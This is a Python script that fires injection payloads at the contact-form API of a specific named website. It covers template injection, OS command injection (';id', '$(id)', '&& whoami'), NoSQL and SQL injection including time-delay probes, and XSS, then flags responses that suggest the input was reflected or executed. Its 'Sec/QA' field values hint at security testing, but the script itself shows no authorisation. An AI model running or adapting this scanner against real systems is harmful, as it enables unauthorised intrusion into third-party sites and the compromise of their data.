import subprocess, urllib.parse, time, sys

URL = "https://www.infinitycapital.bh/api/send"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"

def send(field, value, extra=None):
    d = {"fname":"Sec","lname":"Qa","areacode":"973","tel":"5551234",
         "cname":"QA","subject":"Hello","msg":"body","check":"on",
         "targets":"zzqa@www.infinitycapital.bh", field: value}
    if extra: d.update(extra)
    args = ["curl","-s","-i","-X","POST",URL,"-A",UA,"--max-time","20"]
    for k,v in d.items():
        args += ["-d", urllib.parse.quote(k,safe="")+"="+urllib.parse.quote(str(v),safe="")]
    r = subprocess.run(args, capture_output=True, text=True)
    return r.stdout

def status(raw):
    try: return raw.split()[1]
    except: return "?"
def body(raw):
    return raw.split("\r\n\r\n",1)[1] if "\r\n\r\n" in raw else raw

MARK = "ZQ" + "9" + "77"
classes = {
 "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "{{self.__class__}}"],
 "cmdi": [";id", "|id", "$(id)", "`id`", ";sleep 4", "|sleep 4", "&& whoami"],
 "nosqli": ['{"$ne":null}', '{"$gt":""}', '{"$regex":".*"}', '{"$exists":true}'],
 "sqli": ["' OR '1'='1", "1' OR 1=1-- -", "' UNION SELECT null-- -", "1; WAITFOR DELAY '0:0:5'-- -", "1 AND SLEEP(4)"],
 "xss": ["<script>"+MARK+"</script>", "\"><svg onload=fetch('//x')>"],
}
for cls, payloads in classes.items():
    for f in ["fname","subject","msg","cname","targets"]:
        for p in payloads:
            raw = send(f, p)
            st = status(raw); b = body(raw)
            note = ""
            if MARK in b: note = "REFLECTED-MARKER"
            if "49" in b and cls=="ssti": note += " SSTI49?"
            if "uid=" in b and cls=="cmdi": note += " CMDI!"
            print(f"{cls:7} {f:8} st={st:4} len={len(b):5} {p[:45]:45} {note}", flush=True)
            time.sleep(0.4)